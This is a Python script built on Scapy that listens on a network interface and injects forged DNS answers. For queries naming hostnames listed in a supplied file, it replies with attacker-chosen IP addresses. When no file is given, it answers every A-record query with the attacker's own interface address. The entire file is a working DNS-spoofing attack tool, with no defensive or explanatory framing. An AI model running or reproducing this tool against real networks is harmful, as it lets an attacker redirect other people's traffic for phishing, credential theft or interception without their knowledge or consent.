from scapy.all import *
import argparse
import datetime
from scapy.layers.dns import *
import netifaces as ni
def dnsSpoof(pkt):

       
        if  pkt.haslayer(DNSQR) and pkt[UDP].dport == 53:
                if len(hostnames)>0 and str(pkt[DNS].qd.qname)[2:-2] in hostnames and pkt[DNS].qd.qtype == 1 and pkt[DNS].qr==0:
                        
                        spoofip = hostnames[str(pkt[DNS].qd.qname)[2:-2]]
                        spoofedpacket = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                             UDP(dport=pkt[UDP].sport, sport= 53) / \
                                              DNS(id=pkt[DNS].id,opcode=pkt[DNS].opcode, rd=0, ra=0, z=0, rcode=0,aa=1, qr=1,qdcount=pkt[DNS].qdcount,ancount=1, nscount=0, arcount=0,
                                          qd=DNSQR(qname=pkt[DNS].qd.qname,qtype=pkt[DNS].qd.qtype, qclass=pkt[DNS].qd.qclass),
                                          an=DNSRR(rrname=pkt[DNS].qd.qname,type = 1, ttl = 600,rdata=spoofip))
                        send(spoofedpacket,iface=dev)
                elif len(hostnames) == 0 and pkt[DNS].qd.qtype == 1 and pkt[DNS].qr==0:
                        spoofip = ni.ifaddresses(dev)[ni.AF_INET][0]['addr']
                        spoofedPayload_IP = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                             UDP(dport=pkt[UDP].sport, sport= 53) / \
                                              DNS(id=pkt[DNS].id,opcode=pkt[DNS].opcode, rd=0, ra=0, z=0, rcode=0,aa=1, qr=1,qdcount=pkt[DNS].qdcount,ancount=1, nscount=0, arcount=0,
                                          qd=DNSQR(qname=pkt[DNS].qd.qname,qtype=pkt[DNS].qd.qtype, qclass=pkt[DNS].qd.qclass),
                                          an=DNSRR(rrname=pkt[DNS].qd.qname,type= 1,ttl=600, rdata=spoofip))
                        send(spoofedPayload_IP,iface=dev)
                        
if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='argparser',add_help=False)
        parser.add_argument('-i', metavar=None,
                        help = 'Listen on network device <interface> (e.g., eth0). ')
        parser.add_argument('-h', metavar=None)
        parser.add_argument('expression', nargs='*', action="store")
        args = parser.parse_args()
        
        if len(args.expression)>0:
                expression =  " ".join(args.expression)
        else :
                expression = "" 
        hostnames= dict()
        if args.h != None:
                fp = open(args.h,"r")
                for line in fp:
                        lineRead = line.split(" ")
                        hostnames[lineRead[1][:-1]] = lineRead[0]
        print(hostnames)
        
        if args.i == None:
                dev = ni.gateways()['default'][ni.AF_INET][1]
        else:
                dev = args.i
        print(dev)
        print(expression)
        sniff(iface = dev,filter=expression, prn=dnsSpoof, store =0)
